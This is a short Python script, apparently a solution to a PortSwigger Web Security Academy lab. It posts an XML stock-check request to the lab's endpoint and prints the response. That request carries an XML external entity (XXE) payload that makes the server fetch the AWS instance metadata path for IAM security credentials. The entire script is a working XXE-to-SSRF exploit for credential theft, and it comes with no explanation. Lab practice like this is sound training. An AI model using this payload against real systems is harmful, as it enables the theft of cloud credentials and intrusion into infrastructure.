import requests

s = requests.Session()

stock_url = 'https://acb01fed1e91ab10c0c81ac2007100ef.web-security-academy.net/product/stock'
xml_post_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'

resp = s.post(stock_url, data=xml_post_data)
print(resp.text)
